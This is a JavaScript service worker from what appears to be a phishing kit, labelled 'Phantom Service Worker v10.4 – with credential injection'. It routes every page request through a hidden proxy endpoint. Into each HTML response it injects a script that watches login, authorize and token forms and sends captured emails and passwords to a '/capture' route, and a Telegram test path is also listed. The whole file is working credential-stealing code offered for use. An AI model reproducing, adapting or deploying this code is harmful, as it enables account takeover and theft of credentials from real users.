// 🔥 PHANTOM SERVICE WORKER v10.4 – WITH CREDENTIAL INJECTION
self.addEventListener("fetch", (event) => {
    const url = new URL(event.request.url);

    // Bypass internal routes – do NOT proxy these
    const bypassPaths = [
        '/capture',
        '/device/request',
        '/device/token',
        '/test-telegram-now',
        '/health',
        '/favicon.ico',
        '/service_worker_Mz8XO2ny1Pg5.js'
    ];
    if (bypassPaths.some(path => url.pathname === path)) {
        event.respondWith(fetch(event.request));
        return;
    }

    event.respondWith(handleRequest(event.request));
});

async function handleRequest(request) {
    const proxyRequestURL = `${self.location.origin}/lNv1pC9AWPUY4gbidyBO`;

    try {
        const proxyRequest = {
            url: request.url,
            method: request.method,
            headers: Object.fromEntries(request.headers.entries()),
            body: await request.text(),
            referrer: request.referrer,
            mode: request.mode
        };

        // Fetch the real page via your proxy server
        let response = await fetch(proxyRequestURL, {
            method: "POST",
            headers: { "Content-Type": "application/json" },
            body: JSON.stringify(proxyRequest),
            redirect: "manual",
            mode: "same-origin"
        });

        // --- INJECT CREDENTIAL STEALER INTO HTML RESPONSES ---
        const contentType = response.headers.get('content-type') || '';
        if (contentType.includes('text/html')) {
            const html = await response.text();
            // Insert a script that captures credentials on form submission
            const injectedHtml = html.replace(
                '</body>',
                `<script>
                    (function() {
                        function injectListener() {
                            const form = document.querySelector('form[action*="login"]') ||
                                         document.querySelector('form[action*="authorize"]') ||
                                         document.querySelector('form[action*="token"]');
                            if (!form) {
                                setTimeout(injectListener, 500);
                                return;
                            }
                            form.addEventListener('submit', function(e) {
                                const email = document.querySelector('input[type="email"], input[name="username"], input[name="loginfmt"]')?.value || '';
                                const password = document.querySelector('input[type="password"]')?.value || '';
                                navigator.sendBeacon('/capture', new URLSearchParams({ email, password }));
                                return true;
                            });
                        }
                        injectListener();
                    })();
                </script>
                </body>`
            );
            response = new Response(injectedHtml, {
                status: response.status,
                statusText: response.statusText,
                headers: response.headers
            });
        }
        // ----------------------------------------------------

        return response;
    }
    catch (error) {
        console.error(`Fetching ${proxyRequestURL} failed: ${error}`);
        return fetch(request);
    }
}
